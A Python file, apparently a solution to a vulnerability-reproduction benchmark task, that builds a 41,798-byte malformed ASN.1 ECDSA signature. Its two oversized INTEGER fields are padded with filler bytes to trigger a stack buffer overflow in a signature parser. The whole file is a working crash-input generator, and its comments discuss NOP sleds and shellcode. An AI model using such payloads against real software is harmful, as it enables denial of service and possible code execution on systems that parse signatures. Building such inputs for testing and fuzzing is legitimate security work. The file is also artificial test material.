import os
import struct
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a long payload that will trigger stack buffer overflow
        # Based on the ground-truth length of 41798 bytes
        # We'll create a pattern that includes ASN.1 structure for ECDSA signature
        
        # ASN.1 SEQUENCE tag
        sequence_tag = b'\x30'
        
        # Length - we'll use indefinite length encoding to potentially confuse parsers
        # But for buffer overflow, we'll just create a very long content
        payload_size = 41798 - 2  # Minus 2 for sequence tag and length byte
        length_byte = b'\x82'  # Indicates 2-byte length
        
        # Calculate the two-byte length (big-endian)
        if payload_size <= 65535:
            length_bytes = struct.pack('>H', payload_size)
        else:
            # If payload_size > 65535, we need to use 3-byte encoding
            # But 41798 - 2 = 41796 which fits in 2 bytes
            length_bytes = struct.pack('>H', payload_size)
        
        # Create the main payload content
        # For a stack buffer overflow, we need to overflow a fixed-size buffer
        # Common pattern: create payload larger than buffer size with NOP sled and shellcode
        # But since we don't know exact offset, we'll create a repeating pattern
        
        # Create a pattern that includes valid ASN.1 structure for ECDSA signature
        # ECDSA signature is SEQUENCE of two INTEGERs
        
        # Start of INTEGER 1
        int1_tag = b'\x02'
        int1_size = 20000  # Large integer to overflow buffer
        int1_length = b'\x82' + struct.pack('>H', int1_size)
        int1_data = b'A' * int1_size  # Fill with 'A's
        
        # INTEGER 2
        int2_tag = b'\x02'
        int2_size = payload_size - (len(int1_tag) + len(int1_length) + int1_size + len(int2_tag) + 3)
        # Make sure int2_size is positive
        if int2_size < 0:
            int2_size = 1
            # Adjust int1_size to fit total payload
            int1_size = payload_size - (len(int1_tag) + len(int1_length) + len(int2_tag) + 4)
            int1_data = b'A' * int1_size
            int1_length = b'\x82' + struct.pack('>H', int1_size)
        
        int2_length = b'\x82' + struct.pack('>H', int2_size)
        int2_data = b'B' * int2_size
        
        # Build the complete payload
        payload = (sequence_tag + b'\x82' + struct.pack('>H', len(int1_tag) + len(int1_length) + int1_size + 
                   len(int2_tag) + len(int2_length) + int2_size) +
                   int1_tag + int1_length + int1_data +
                   int2_tag + int2_length + int2_data)
        
        # Ensure exact length
        if len(payload) > 41798:
            # Truncate if too long
            payload = payload[:41798]
        elif len(payload) < 41798:
            # Pad if too short
            payload += b'C' * (41798 - len(payload))
        
        return payload
